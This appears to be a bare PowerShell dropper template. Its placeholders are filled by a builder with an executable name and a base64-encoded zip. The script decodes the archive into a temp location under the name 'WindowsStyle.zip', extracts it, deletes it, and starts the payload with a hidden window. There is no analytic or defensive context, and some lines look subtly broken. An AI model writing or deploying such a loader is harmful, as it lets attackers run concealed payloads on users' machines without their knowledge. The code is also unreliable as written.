$exec = %exec%
$base64String = %b64zip%

$temp = New-TemporaryFile
$temp_path = Split-Path $temp.FullName

$zipfile = "WindowsStyle.zip"

$bytes = [System.Convert]::FromBase64String($base64String)

[IO.File]::WriteAllBytes($temp.FullName, $bytes)

Expand-Archive -Path $temp.FullName -DestinationPath Join-Path $temp_path $zipfile
Remove-Item $zipfile
Start-Process $exec -WindowStyle Hidden